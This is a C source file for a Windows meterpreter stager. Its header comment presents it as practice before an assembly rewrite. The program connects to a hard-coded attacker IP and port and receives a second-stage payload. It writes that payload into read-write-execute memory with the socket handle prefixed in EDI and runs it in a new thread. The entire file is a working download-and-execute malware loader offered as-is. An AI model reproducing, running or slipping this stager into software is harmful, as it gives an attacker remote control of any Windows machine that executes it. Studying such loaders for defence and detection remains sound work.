/*
* 
* A meterpreter stager in C. The point here is to get familiar
* with the process of staging a valid meterpreter session. Then,
* we are going to write the whole thing in assembly.
* 
*/

#include <stdio.h>
#include "winsock2.h"

#pragma comment(lib, "ws2_32")
#pragma warning( disable:4996 )

int main()
{
	PUCHAR pStage2Buf = NULL;
	HANDLE hThrd = NULL;
	SOCKET sock = NULL;
	INT status = 0x0;
	DWORD dwStage2Size = 0x0;
	DWORD dwBytesRecved = 0x0;
	DWORD dwCurBytesRecved = 0x0;
	WSADATA wsaData = { 0x0 };

	if (0x0 != WSAStartup(MAKEWORD(2, 2), &wsaData))
	{
		printf("[-]Failed to initialize WSA API with error: 0x%.8X...\n", WSAGetLastError());
		goto _exit;
	}

	if (INVALID_SOCKET == (sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)))
	{
		printf("[-]Failed to create socket with error: 0x%.8X...\n", WSAGetLastError());
		goto _exit;
	}

	// this socket should end up in edi (rdi) when
	// second stage beins
	printf("[*]Socket handle: %ld, 0x%X\n", sock, sock);

	struct sockaddr_in sockAddr = { 0x0 };
	sockAddr.sin_family = PF_INET;
	//
	// change to your IP address
	//
	sockAddr.sin_addr.s_addr = inet_addr("192.168.3.138");
	//
	// change to your port
	//
	sockAddr.sin_port = htons(443);

	if (0x0 != (status = connect(sock, (PSOCKADDR)&sockAddr, sizeof(SOCKADDR))))
	{
		printf("[-]Failed to connect to host 0x%.8X...\n", WSAGetLastError());
		goto _exit;
	}

	// read first four bytes, it's the size of stage 2
	dwBytesRecved = recv(sock, (PUCHAR)&dwStage2Size, 4, 0);
	if (4 != dwBytesRecved)
	{
		printf("[-]Failed to read data from socket with error: 0x%.8X ... \n", WSAGetLastError());
		goto _exit;
	}

	printf("[*]%d bytes of data recieved, need to allocated %ld bytes of stage 2 buffer ...\n", dwBytesRecved, dwStage2Size);

	//
	// allocate memory region for stage 2
	// we need only 5 bytes of extra space for the preparation
	// opcodes (mov edi, sock handle), 0x10 is arbitrary (>= 5 is OK)
	// 
	pStage2Buf = (PUCHAR)VirtualAlloc(NULL, dwStage2Size + 0x10, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == pStage2Buf)
	{
		printf("[-]Failed to allocate stage 2 memory space with error: 0x%.8X ...\n", GetLastError());
		goto _exit;
	}

	printf("[*]Stage 2 buffer @ >>>>>>>>> 0x%p\n", (PVOID)pStage2Buf);

	//
	// according to meterpreter source code, we have to move socket handle
	// to edi, so the first byte of our shellcode should be 0xbf, followed
	// by our socket handle, a total of 5 bytes
	//
	pStage2Buf[0] = 0xBF;
	memcpy(pStage2Buf + 1, &sock, 4);

	//
	// read stage 2 payload, write to buffer
	// clear dwBytesRecved
	// do a while loop because sometimes a single recv would fail on large data set
	//
	dwBytesRecved = 0x0;
	PUCHAR pStage2BufAddr = pStage2Buf;
	// skip first 5 bytes of staging opcode
	pStage2BufAddr += 5;
	while (dwBytesRecved < dwStage2Size)
	{
		dwBytesRecved += (dwCurBytesRecved = recv(sock, pStage2BufAddr, dwStage2Size - dwBytesRecved, 0));
		pStage2BufAddr += dwCurBytesRecved;

		if (SOCKET_ERROR == dwCurBytesRecved)
			goto _exit;
	}

	if (dwBytesRecved != dwStage2Size)
	{
		printf("[-]Failed to read stage 2 payload with error: 0x%.8X ... \n", WSAGetLastError());
		goto _exit;
	}

	printf("[*]Received %ld bytes of stage 2 payload ... \n", dwBytesRecved);
	printf("[*]Begin stage 2 ...\n");

	// execute stage 2
	hThrd = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pStage2Buf, NULL, NULL, NULL);
	WaitForSingleObject(hThrd, INFINITE);

_exit:
	if (NULL != sock)
		closesocket(sock);
	if (NULL != pStage2Buf)
		VirtualFree(pStage2Buf, 0, MEM_RELEASE);
	WSACleanup();

	return 0;
}